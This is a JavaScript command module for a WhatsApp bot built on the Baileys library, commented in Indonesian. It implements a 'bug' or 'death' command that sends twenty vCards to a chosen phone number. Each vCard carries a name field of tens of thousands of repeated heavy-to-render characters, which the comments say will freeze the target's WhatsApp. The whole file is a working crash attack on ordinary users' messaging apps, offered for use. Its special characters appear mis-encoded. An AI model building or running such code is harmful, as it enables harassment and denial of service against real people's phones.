const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const fs = require('fs');

module.exports = {
    name: 'bug',
    alias: ['death', 'v', 'sraff'],
    async execute(sock, msg, args) {
        const { from, isOwner, reply, react, original } = msg;

        if (!isOwner) return reply('Cuma owner wir! �0�9');

        let target = "";
        let q = args.join(" ");
        if (msg.quoted) {
            target = msg.quoted.participant || msg.quoted.sender;
        } else if (q) {
            target = q.replace(/[^0-9]/g, "") + '@s.whatsapp.net';
        }

        if (!target) return reply('Mana nomor targetnya?');

        await react('�7�9�1�5');

        try {
            // Teks miring/unik (Aesthetic font) ala sraff yang sangat berat dirender
            const sraffTeks = "�7�7".repeat(10000);
            const poison = "�6�0�6�2�6�7 �6�8�6�7�3�7�3�7�6�7�3�1 �3�1�6�7�3�4�3�3�3�1 " + "�7�7".repeat(20000);

            // Kita kirim 20 Vcard sekaligus. 
            // Vcard bikin WA target nyecan nama kontak, disitulah dia bakalan freeze.
            for (let i = 0; i < 20; i++) {
                const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                              'FN:' + poison + '\n' + 
                              'TEL;type=CELL;type=VOICE;waid=' + target.split('@')[0] + ':+' + target.split('@')[0] + '\n' + 
                              'END:VCARD';

                await sock.sendMessage(target, {
                    contacts: {
                        displayName: 'Sraff Death System',
                        contacts: [{ vcard }]
                    }
                }, { quoted: original });
            }

            // Balasan Sukses (Teks biasa biar gak kotak-kotak di HP lu)
            await reply("SUCCESS SEND SRAFF-STYLE BUG!\nTarget: " + target.split('@')[0] + "\nEfek: Vcard Overload.");

            if (fs.existsSync('./all/sound/final.mp3')) {
                await sock.sendMessage(from, { 
                    audio: fs.readFileSync('./all/sound/final.mp3'), 
                    mimetype: 'audio/mpeg', 
                    ptt: true 
                }, { quoted: original });
            }

        } catch (e) {
            console.log(e);
            reply('Bot lu tewas wir pas ngirim!');
        }
    }
};
